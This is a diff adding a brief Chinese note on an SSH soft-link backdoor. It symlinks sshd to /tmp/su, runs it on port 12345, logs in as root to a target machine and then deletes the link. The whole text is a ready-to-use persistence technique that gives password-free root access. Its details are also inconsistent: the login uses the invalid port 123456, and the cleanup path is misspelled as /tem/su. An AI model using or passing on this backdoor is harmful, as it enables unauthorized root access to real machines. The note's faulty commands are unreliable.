@@ -1,0 +1,9 @@
+# 1、ssh 软链接
+创建ssh软链接
+ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345
+
+连接靶机
+ssh root@ip -p 123456
+
+删除软链接
+unlink /tem/su
